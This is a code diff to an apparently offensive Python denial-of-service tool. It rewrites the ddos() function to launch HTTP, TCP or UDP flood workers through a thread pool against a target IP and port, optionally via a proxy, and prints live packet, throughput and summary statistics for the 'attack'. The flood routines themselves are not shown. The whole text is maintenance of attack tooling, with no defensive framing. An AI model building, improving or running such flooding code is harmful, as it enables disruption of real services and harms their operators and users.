@@ -47,7 +47,6 @@ def banner():
                           ''')
 
 def ddos():
-
     import socket
     import time
     import threading
@@ -211,25 +210,23 @@ def ddos():
         print(f"\nStarting attack..." + (f" Using proxy {proxy}" if proxy else ""))
         start_time = time.time()
 
-        threads = []
-        methods = [http_flood, tcp_flood, udp_flood]
-        for flood_method in methods:
+        with ThreadPoolExecutor(max_workers=thread_count) as executor:
+            methods = [http_flood, tcp_flood, udp_flood]
+            futures = []
             for _ in range(thread_count):
                 active_threads += 1
-                t = threading.Thread(target=flood_method, args=(target_ip, port, data_size, duration, proxy))
-                threads.append(t)
-                t.start()
+                futures.append(executor.submit(methods[method - 1], target_ip, port, data_size, duration, proxy))
 
-        while time.time() - start_time < duration:
-            mb_sent = total_data_sent / (1024 * 1024)
-            packets = total_data_sent / data_size
-            elapsed = time.time() - start_time
-            pps = packets / elapsed if elapsed > 0 else 0
-            print(f"\r[*] Target: {target_ip}:{port} | Packets: {packets:.0f} | Data: {mb_sent:.2f}MB | PPS: {pps:.0f} | Threads: {active_threads} | Response Time: {highest_response_time:.2f}ms", end='', flush=True)
-            time.sleep(0.001)
+            while time.time() - start_time < duration:
+                mb_sent = total_data_sent / (1024 * 1024)
+                packets = total_data_sent / data_size
+                elapsed = time.time() - start_time
+                pps = packets / elapsed if elapsed > 0 else 0
+                print(f"\r[*] Target: {target_ip}:{port} | Packets: {packets:.0f} | Data: {mb_sent:.2f}MB | PPS: {pps:.0f} | Threads: {active_threads} | Response Time: {highest_response_time:.2f}ms", end='', flush=True)
+                time.sleep(0.001)
 
-        for t in threads:
-            t.join()
+        for future in futures:
+            future.result()
 
         print("\n=== Attack Summary ===")
         print(f"Total Data Sent: {total_data_sent / (1024 * 1024):.2f} MB")
